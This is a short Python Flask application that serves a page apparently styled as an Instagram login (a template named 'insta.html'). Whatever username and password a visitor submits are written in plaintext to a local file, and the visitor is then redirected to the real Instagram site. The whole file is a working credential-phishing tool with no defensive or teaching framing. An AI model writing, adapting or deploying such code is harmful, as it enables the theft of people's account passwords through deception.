from flask import Flask, render_template, request, redirect
import datetime

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        # Save login details to file
        with open('logins.txt', 'a') as f:
            f.write(f"{datetime.datetime.now()} - Username: {username}, Password: {password}\n")

        # Redirect to any website (e.g., Instagram)
        return redirect("https://www.instagram.com")

    return render_template('insta.html')

if __name__ == '__main__':
    app.run(debug=True)
